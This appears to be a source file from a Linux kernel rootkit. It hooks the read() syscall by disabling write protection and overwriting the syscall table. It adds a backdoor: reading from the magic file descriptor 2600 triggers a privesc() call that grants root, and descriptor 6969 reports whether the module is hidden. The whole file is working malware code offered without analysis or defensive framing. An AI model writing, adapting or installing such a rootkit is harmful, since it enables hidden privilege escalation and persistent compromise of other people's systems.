#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/string.h>

#include "../../include/hooking.h"
#include "../../include/h_read.h"
#include "../../include/h_kill.h"

sysfun_t old_read;

#define FD_SUPERUSER    (2600)
#define FD_ISMODHIDDEN  (6969)

void hijack_read(void)
{
    unsigned long old_cr0 = unprotect_memory();

    old_read = (sysfun_t)syscall_table[__NR_read];
    m_printd(KERN_INFO "Old read @ %p", old_read);

    syscall_table[__NR_read] = (uint64_t)new_read;
    m_printd(KERN_INFO "Hooked read(), new read @ %p", &syscall_table[__NR_read]);
    protect_memory(old_cr0);
}

int new_read(struct pt_regs *regs)
{
    int fd = (int)regs->di;
    void *buf = (void *)regs->si;
    size_t count = (size_t)regs->dx;
    
    int is_hidden = is_module_hidden();
    int retval;

    if (fd == FD_SUPERUSER)
    {
        privesc(); 
        return 0;
    } else if (fd == FD_ISMODHIDDEN) {
        return copy_to_user(buf, &is_hidden, sizeof(int));
    }

    retval = old_read(regs);

    return retval;
}

void restore_read(void)
{
    unsigned long old_cr0 = unprotect_memory();
    syscall_table[__NR_read] = (uint64_t)old_read;
    protect_memory(old_cr0);
}
